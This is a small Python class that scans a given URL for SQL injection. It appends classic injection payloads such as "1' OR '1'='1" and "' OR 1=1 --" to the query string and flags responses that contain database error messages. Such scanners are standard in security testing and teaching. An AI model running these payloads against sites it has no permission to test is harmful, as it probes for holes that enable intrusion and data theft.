import requests

class SQLiScanner:
    def __init__(self, target_url):
        self.url = target_url
        self.payloads = ["'", "''", "1' OR '1'='1", "' OR 1=1 --", '" OR 1=1 --']
        self.findings = []

    def scan(self):
        print(f"[*] Testing SQLi on: {self.url}")
        for payload in self.payloads:
            if "?" not in self.url: continue
            
            test_url = f"{self.url}{payload}"
            try:
                response = requests.get(test_url, timeout=5)
                # Detection: Check for classic SQL error strings
                errors = ["mysql_fetch_array()", "you have an error in your sql syntax", "unclosed quotation mark"]
                
                for error in errors:
                    if error.lower() in response.text.lower():
                        self.findings.append({
                            "url": test_url,
                            "payload": payload,
                            "evidence": f"SQL Error detected: {error}"
                        })
                        return self.findings # Found one, move to next endpoint
            except Exception:
                continue
        return self.findings
